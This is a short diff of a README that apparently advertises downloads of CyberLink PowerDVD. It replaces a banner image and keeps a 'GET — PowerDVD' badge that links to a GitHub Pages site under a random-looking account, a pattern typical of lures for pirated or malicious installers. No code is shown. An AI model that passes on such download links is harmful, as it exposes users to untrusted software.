@@ -1,6 +1,6 @@
 # CyberLink PowerDVD — Media Playback, Blu-ray & Digital Entertainment
 
-![Banner Placeholder](https://img.utorrentprogrammy.ru/uploads/posts/2017-12/1512465637_91ny0nqsuul._sl1500_.jpg)
+![Banner Placeholder](https://i.ebayimg.com/images/g/I-EAAeSwJKpoxBUS/s-l1600.jpg)
 
 [![GET — PowerDVD](https://img.shields.io/badge/GET%20%E2%80%94%20PowerDVD-0078D6?style=for-the-badge&logoColor=white)](https://jostmq39603.github.io/.github/PowerDVD-Media-Player)
 
